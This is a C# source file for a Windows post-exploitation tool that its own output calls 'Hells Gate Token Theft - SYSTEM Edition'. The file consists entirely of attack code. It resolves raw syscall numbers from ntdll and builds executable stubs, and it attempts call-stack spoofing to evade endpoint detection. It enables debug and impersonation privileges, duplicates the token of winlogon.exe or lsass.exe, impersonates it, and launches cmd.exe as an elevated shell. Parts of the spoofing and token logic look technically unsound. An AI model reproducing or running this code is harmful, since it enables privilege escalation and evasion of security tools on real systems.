using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal static class Program
{
    #region Native Strukturen

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute, dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    #endregion

    #region Konstanten

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint PROCESS_DUP_HANDLE = 0x0040;
    private const uint PROCESS_CREATE_PROCESS = 0x0080;

    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;

    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_READWRITE = 0x04;
    private const uint CONTEXT_FULL = 0x100007;
    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const uint STARTF_USESHOWWINDOW = 0x00000001;
    private const short SW_SHOWNORMAL = 1;

    private const uint TokenImpersonation = 2;
    private const uint SecurityImpersonation = 2;

    #endregion

    #region Win32 API

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcessId();

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtGetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress,
        ref ulong RegionSize, uint NewProtect, out uint OldProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtFlushInstructionCache(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, IntPtr lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

    #endregion

    #region Token Information

    private static int GetTokenSessionId(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, 12, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, 12, pSessionId, dwLen, out dwLen))
                    return Marshal.ReadInt32(pSessionId);
            }
            finally { Marshal.FreeHGlobal(pSessionId); }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, 20, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, 20, pElev, dwLen, out dwLen))
                    return Marshal.ReadInt32(pElev) != 0;
            }
            finally { Marshal.FreeHGlobal(pElev); }
        }
        return false;
    }

    #endregion

    #region RIP-Spoofing

    private static class SpoofingEngine
    {
        private static IntPtr _ntdllBase;
        private static IntPtr _syscallLandingPad;
        private static IntPtr _syntheticStack;
        private static int _stackDepth = 16;

        public static void Initialize()
        {
            _ntdllBase = GetModuleHandle("ntdll.dll");
            if (_ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[Spoofing] Failed to get ntdll.dll base");
                return;
            }

            _syscallLandingPad = FindSyscallLandingPad();
            if (_syscallLandingPad != IntPtr.Zero)
                Console.WriteLine($"[Spoofing] Landing pad found");
            else
                Console.WriteLine("[Spoofing] No landing pad found");
        }

        private static IntPtr FindSyscallLandingPad()
        {
            try
            {
                byte[] ntdllCode = new byte[4096];
                Marshal.Copy(_ntdllBase, ntdllCode, 0, ntdllCode.Length);

                for (int i = 0; i < ntdllCode.Length - 3; i++)
                {
                    if (ntdllCode[i] == 0x0F && ntdllCode[i + 1] == 0x05 && ntdllCode[i + 2] == 0xC3)
                    {
                        return (IntPtr)((long)_ntdllBase + i);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private static byte[] CreateSyntheticStack(IntPtr landingPad, int depth)
        {
            int frameSize = 16;
            byte[] stack = new byte[depth * frameSize];

            for (int i = 0; i < depth; i++)
            {
                byte[] retAddr = BitConverter.GetBytes((ulong)landingPad);
                Buffer.BlockCopy(retAddr, 0, stack, i * frameSize, 8);

                ulong nextRbp = (ulong)((depth - i - 1) * frameSize);
                byte[] rbpBytes = BitConverter.GetBytes(nextRbp);
                Buffer.BlockCopy(rbpBytes, 0, stack, i * frameSize + 8, 8);
            }

            return stack;
        }

        public static bool ApplyStackSpoofing()
        {
            if (_syscallLandingPad == IntPtr.Zero) return false;

            try
            {
                byte[] syntheticStack = CreateSyntheticStack(_syscallLandingPad, _stackDepth);
                _syntheticStack = VirtualAlloc(IntPtr.Zero, (uint)syntheticStack.Length,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (_syntheticStack == IntPtr.Zero) return false;

                Marshal.Copy(syntheticStack, 0, _syntheticStack, syntheticStack.Length);

                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = CONTEXT_FULL;
                IntPtr hThread = GetCurrentThread();

                if (NtGetContextThread(hThread, ref ctx) != 0) return false;

                ulong originalRsp = ctx.Rsp;
                ulong originalRbp = ctx.Rbp;

                ctx.Rsp = (ulong)_syntheticStack + (ulong)((_stackDepth - 1) * 16);
                ctx.Rbp = ctx.Rsp - 8;

                if (NtSetContextThread(hThread, ref ctx) != 0) return false;

                Timer restoreTimer = null;
                restoreTimer = new Timer(_ =>
                {
                    try
                    {
                        CONTEXT restoreCtx = new CONTEXT();
                        restoreCtx.ContextFlags = CONTEXT_FULL;
                        NtGetContextThread(GetCurrentThread(), ref restoreCtx);
                        restoreCtx.Rsp = originalRsp;
                        restoreCtx.Rbp = originalRbp;
                        NtSetContextThread(GetCurrentThread(), ref restoreCtx);
                        VirtualFree(_syntheticStack, 0, MEM_RELEASE);
                        restoreTimer?.Dispose();
                    }
                    catch { }
                }, null, 5000, Timeout.Infinite);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Spoofing] Error: {ex.Message}");
                return false;
            }
        }

        public static byte[] CreateRipSpoofedStub(uint ssn)
        {
            if (_syscallLandingPad == IntPtr.Zero)
            {
                return new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1,
                    0x0F, 0x05,
                    0xC3
                };
            }

            byte[] stub = new byte[]
            {
                0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                0x4C, 0x8B, 0xD1,
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0xFF, 0xE0,
            };

            byte[] addrBytes = BitConverter.GetBytes((long)_syscallLandingPad);
            Buffer.BlockCopy(addrBytes, 0, stub, 11, 8);

            return stub;
        }
    }

    #endregion

    #region Hells Gate

    private static class HellsGateWithSpoofing
    {
        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        private static Dictionary<string, uint> _syscallSSNs = new Dictionary<string, uint>();

        public static uint ExtractSSN(string functionName)
        {
            try
            {
                string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
                byte[] peData = File.ReadAllBytes(ntdllPath);

                int e_lfanew = BitConverter.ToInt32(peData, 0x3C);
                if (e_lfanew <= 0 || e_lfanew + 256 >= peData.Length) return 0;

                int exportRVA = BitConverter.ToInt32(peData, e_lfanew + 0x88);
                if (exportRVA <= 0 || exportRVA + 256 >= peData.Length) return 0;

                int numberOfNames = BitConverter.ToInt32(peData, exportRVA + 0x18);
                int addressOfNames = BitConverter.ToInt32(peData, exportRVA + 0x20);
                int addressOfNameOrdinals = BitConverter.ToInt32(peData, exportRVA + 0x24);
                int addressOfFunctions = BitConverter.ToInt32(peData, exportRVA + 0x1C);

                for (int i = 0; i < numberOfNames && i < 10000; i++)
                {
                    int nameRVA = BitConverter.ToInt32(peData, addressOfNames + i * 4);
                    if (nameRVA <= 0 || nameRVA + 256 >= peData.Length) continue;

                    string name = ReadCString(peData, nameRVA);
                    if (string.IsNullOrEmpty(name)) continue;

                    if (name == functionName)
                    {
                        short ordinal = BitConverter.ToInt16(peData, addressOfNameOrdinals + i * 2);
                        int functionRVA = BitConverter.ToInt32(peData, addressOfFunctions + ordinal * 4);
                        if (functionRVA <= 0 || functionRVA + 32 >= peData.Length) return 0;

                        for (int j = 0; j < 32 && functionRVA + j + 4 < peData.Length; j++)
                        {
                            if (peData[functionRVA + j] == 0xB8)
                            {
                                uint ssn = BitConverter.ToUInt32(peData, functionRVA + j + 1);
                                Console.WriteLine($"[HellsGate] {functionName} -> SSN: 0x{ssn:X}");
                                return ssn;
                            }
                        }
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HellsGate] Error: {ex.Message}");
            }
            return 0;
        }

        private static string ReadCString(byte[] data, int offset)
        {
            int length = 0;
            while (offset + length < data.Length && data[offset + length] != 0 && length < 256)
                length++;
            return Encoding.ASCII.GetString(data, offset, length);
        }

        public static void RegisterSyscall(string name)
        {
            if (_syscallStubs.ContainsKey(name)) return;

            uint ssn = ExtractSSN(name);
            if (ssn == 0)
            {
                Console.WriteLine($"[HellsGate] Warning: Could not extract SSN for {name}");
                return;
            }

            _syscallSSNs[name] = ssn;
            byte[] stub = SpoofingEngine.CreateRipSpoofedStub(ssn);
            IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubAddr == IntPtr.Zero) return;

            Marshal.Copy(stub, 0, stubAddr, stub.Length);

            ulong regionSize = (ulong)stub.Length;
            IntPtr baseAddr = stubAddr;
            NtProtectVirtualMemory((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out _);
            NtFlushInstructionCache((IntPtr)(-1), stubAddr, (uint)stub.Length);

            _syscallStubs[name] = stubAddr;
        }

        public static T GetSyscall<T>(string name) where T : class
        {
            if (!_syscallStubs.ContainsKey(name))
                RegisterSyscall(name);

            if (_syscallStubs.ContainsKey(name))
                return Marshal.GetDelegateForFunctionPointer<T>(_syscallStubs[name]);

            return null;
        }

        public static void Cleanup()
        {
            foreach (var stub in _syscallStubs.Values)
            {
                VirtualFree(stub, 0, MEM_RELEASE);
            }
            _syscallStubs.Clear();
            _syscallSSNs.Clear();
        }
    }

    #endregion

    #region Syscall Delegates

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, uint TokenType, out IntPtr NewTokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtCloseDelegate(IntPtr Handle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtQueryInformationTokenDelegate(IntPtr TokenHandle, int TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    #endregion

    #region Syscall Wrapper

    private static NtOpenProcessDelegate _ntOpenProcess;
    private static NtOpenProcessTokenDelegate _ntOpenProcessToken;
    private static NtDuplicateTokenDelegate _ntDuplicateToken;
    private static NtCloseDelegate _ntClose;
    private static NtQueryInformationTokenDelegate _ntQueryInfoToken;

    private static void InitializeSyscalls()
    {
        Console.WriteLine("[*] Initializing Hells Gate syscalls with RIP-Spoofing...");

        _ntOpenProcess = HellsGateWithSpoofing.GetSyscall<NtOpenProcessDelegate>("NtOpenProcess");
        _ntOpenProcessToken = HellsGateWithSpoofing.GetSyscall<NtOpenProcessTokenDelegate>("NtOpenProcessToken");
        _ntDuplicateToken = HellsGateWithSpoofing.GetSyscall<NtDuplicateTokenDelegate>("NtDuplicateToken");
        _ntClose = HellsGateWithSpoofing.GetSyscall<NtCloseDelegate>("NtClose");
        _ntQueryInfoToken = HellsGateWithSpoofing.GetSyscall<NtQueryInformationTokenDelegate>("NtQueryInformationToken");

        Console.WriteLine();
    }

    #endregion

    #region Privilege Helper

    private static bool EnableDebugPrivilege()
    {
        Console.WriteLine("[*] Enabling SeDebugPrivilege...");

        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            Console.WriteLine($"[-] OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            Console.WriteLine($"[-] LookupPrivilegeValue failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine($"[-] AdjustTokenPrivileges failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hToken);
            return false;
        }

        int lastError = Marshal.GetLastWin32Error();
        if (lastError != 0)
        {
            Console.WriteLine($"[-] AdjustTokenPrivileges error: {lastError}");
            CloseHandle(hToken);
            return false;
        }

        Console.WriteLine("[+] SeDebugPrivilege enabled successfully!");
        CloseHandle(hToken);
        return true;
    }

    private static bool EnableImpersonatePrivilege()
    {
        Console.WriteLine("[*] Enabling SeImpersonatePrivilege...");

        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            Console.WriteLine($"[-] OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeImpersonatePrivilege", out luid))
        {
            Console.WriteLine($"[-] LookupPrivilegeValue failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine($"[-] AdjustTokenPrivileges failed: {Marshal.GetLastWin32Error()}");
            CloseHandle(hToken);
            return false;
        }

        int lastError = Marshal.GetLastWin32Error();
        if (lastError != 0)
        {
            Console.WriteLine($"[-] AdjustTokenPrivileges error: {lastError}");
            CloseHandle(hToken);
            return false;
        }

        Console.WriteLine("[+] SeImpersonatePrivilege enabled successfully!");
        CloseHandle(hToken);
        return true;
    }

    #endregion

    #region Helper

    private static uint FindTargetPid(string processName)
    {
        try
        {
            var processes = Process.GetProcessesByName(processName);
            if (processes.Length > 0)
                return (uint)processes[0].Id;
        }
        catch { }
        return 0;
    }

    #endregion

    #region Main - Working Version ohne SeAssignPrimaryTokenPrivilege

    public static void Main()
    {
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine("[*] Hells Gate Token Theft - SYSTEM Edition");
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine();

        SpoofingEngine.Initialize();
        Console.WriteLine("[*] Applying stack spoofing...");
        SpoofingEngine.ApplyStackSpoofing();
        Console.WriteLine();

        InitializeSyscalls();

        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
        Console.WriteLine($"[*] Admin Rights: {isAdmin}");
        Console.WriteLine($"[*] Process ID: {GetCurrentProcessId()}");

        if (!isAdmin)
        {
            Console.WriteLine("[-] This tool requires Administrator privileges!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine();

        // Aktiviere benötigte Privilegien
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine("[*] Enabling required privileges...");
        Console.WriteLine();

        bool debugEnabled = EnableDebugPrivilege();
        bool impersonateEnabled = EnableImpersonatePrivilege();

        if (!debugEnabled || !impersonateEnabled)
        {
            Console.WriteLine("[!] Some privileges could not be enabled.");
            Console.WriteLine("[!] This may cause access denied errors.");
            Console.WriteLine();
        }

        // ===============================================
        // WinLogon Token - Alternative Methode
        // ===============================================

        Console.WriteLine("[*] Looking for winlogon.exe...");
        uint winlogonPid = FindTargetPid("winlogon");

        if (winlogonPid == 0)
        {
            Console.WriteLine("[-] Could not find winlogon.exe!");
            Console.WriteLine("[*] Trying lsass.exe instead...");
            winlogonPid = FindTargetPid("lsass");

            if (winlogonPid == 0)
            {
                Console.WriteLine("[-] Could not find any suitable process!");
                Console.ReadKey();
                return;
            }
        }

        Console.WriteLine($"[+] Found target with PID: {winlogonPid}");

        try
        {
            // Prozess mit PROCESS_CREATE_PROCESS Zugriff öffnen
            IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, false, winlogonPid);

            if (hProcess == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] Could not open process: {error} (0x{error:X8})");
                Console.ReadKey();
                return;
            }

            Console.WriteLine($"[+] Process opened: 0x{hProcess.ToInt64():X}");

            // Token öffnen
            IntPtr hToken = IntPtr.Zero;
            bool tokenSuccess = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken);
            CloseHandle(hProcess);

            if (!tokenSuccess || hToken == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] Could not open token: {error} (0x{error:X8})");
                Console.ReadKey();
                return;
            }

            Console.WriteLine($"[+] Token opened: 0x{hToken.ToInt64():X}");

            // Token Info anzeigen
            try
            {
                int session = GetTokenSessionId(hToken);
                bool elevated = IsTokenElevated(hToken);
                Console.WriteLine($"[+] Token Info:");
                Console.WriteLine($"    - Session: {session}");
                Console.WriteLine($"    - Elevated: {elevated}");
            }
            catch { }

            Console.WriteLine();
            Console.WriteLine("[*] Creating impersonation token...");

            // Impersonation Token erstellen
            IntPtr hImpersonationToken = IntPtr.Zero;
            bool dupSuccess = DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE,
                IntPtr.Zero, SecurityImpersonation, TokenImpersonation, out hImpersonationToken);

            if (!dupSuccess || hImpersonationToken == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] DuplicateTokenEx failed: {error}");
                CloseHandle(hToken);
                Console.ReadKey();
                return;
            }

            Console.WriteLine("[+] Impersonation token created");
            CloseHandle(hToken);

            // Impersonate den aktuellen Thread
            Console.WriteLine("[*] Impersonating target...");

            if (!ImpersonateLoggedOnUser(hImpersonationToken))
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] Impersonation failed: {error}");
                CloseHandle(hImpersonationToken);
                Console.ReadKey();
                return;
            }

            Console.WriteLine("[+] Impersonation successful!");
            Console.WriteLine("[*] Current thread now runs as the target user");
            Console.WriteLine("[*] Starting SYSTEM shell...");

            // Jetzt einen neuen Prozess im Kontext des impersonierten Threads starten
            // Verwende CreateProcess mit dem impersonierten Token
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = (ushort)SW_SHOWNORMAL;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Wichtig: Verwende den aktuellen Prozess als Parent
            // Das neue Process erbt den impersonierten Token
            bool processStarted = CreateProcess(
                null,
                "cmd.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                true,  // Handle vererben
                CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (processStarted)
            {
                Console.WriteLine($"[+] cmd.exe started with PID: {pi.dwProcessId}");
                Console.WriteLine();
                Console.WriteLine("[+] ===============================================");
                Console.WriteLine("[+] !!! SUCCESS !!!");
                Console.WriteLine("[+] A new cmd.exe is running with elevated privileges!");
                Console.WriteLine("[+] ===============================================");
                Console.WriteLine();
                Console.WriteLine("[*] In the new cmd.exe window, type: whoami");
                Console.WriteLine("[*] Also try: whoami /groups | findstr S-1-16");

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] CreateProcess failed: {error} (0x{error:X8})");

                if (error == 5)
                {
                    Console.WriteLine();
                    Console.WriteLine("[!] Access Denied. Trying alternative method...");

                    // Alternative: Neue Konsolen-Session
                    processStarted = CreateProcess(
                        null,
                        "cmd.exe",
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        CREATE_NEW_CONSOLE,
                        IntPtr.Zero,
                        Environment.GetEnvironmentVariable("SystemRoot") + "\\System32",
                        ref si,
                        out pi);

                    if (processStarted)
                    {
                        Console.WriteLine($"[+] cmd.exe started with PID: {pi.dwProcessId}");
                        Console.WriteLine("[+] !!! SUCCESS !!!");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
            }

            // Aufräumen
            RevertToSelf();
            CloseHandle(hImpersonationToken);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
        }

        Console.WriteLine();
        Console.WriteLine("[*] Press any key to exit...");
        Console.ReadKey();

        HellsGateWithSpoofing.Cleanup();
    }

    #endregion
}
